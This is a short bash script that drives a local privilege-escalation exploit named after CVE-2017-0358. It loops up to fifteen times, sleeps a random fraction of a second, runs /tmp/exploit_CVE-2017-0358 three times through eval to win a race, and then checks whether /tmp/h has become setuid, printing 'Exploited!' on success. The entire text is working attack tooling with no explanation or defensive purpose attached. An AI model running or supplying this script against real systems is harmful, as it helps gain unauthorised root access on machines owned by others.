#!/bin/bash

cmd_to_exec='/tmp/exploit_CVE-2017-0358;'
cant_max=15
cant_sleep=0


while [ $cant_max -gt 0 ]
do

  v=$[100 + (RANDOM % 100)]$[1000 + (RANDOM % 1000)]
  v=$[RANDOM % 1].${v:1:2}${v:4:3}
  echo "sleeping $v seconds"
  sleep $v
  eval "$cmd_to_exec $cmd_to_exec $cmd_to_exec"

  cant_max=$((cant_max-1))
  res=$(ls -l /tmp/h | cut -d' ' -f1 | grep -i rws)
  if [ ${#res} -gt 3 ]
  then
      echo "Exploited!"
      break
  fi

done

